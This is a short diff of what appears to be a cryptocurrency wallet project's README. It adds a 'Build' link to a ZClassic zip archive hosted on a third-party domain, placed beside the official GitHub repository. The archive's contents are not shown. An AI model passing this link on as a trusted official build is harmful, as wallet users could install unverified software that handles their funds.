@@ -40,7 +40,7 @@ EnJoY and star github project!
 
 - Java Code: https://github.com/fxminer/zcash-swing-wallet-ui
 
-- ZClassic: https://github.com/z-classic/zclassic
+- ZClassic: https://github.com/z-classic/zclassic Build: https://zcash.dl.mercerweiss.com/zclassic-v1.0.5.zip
 
 ## Backup wallet
 
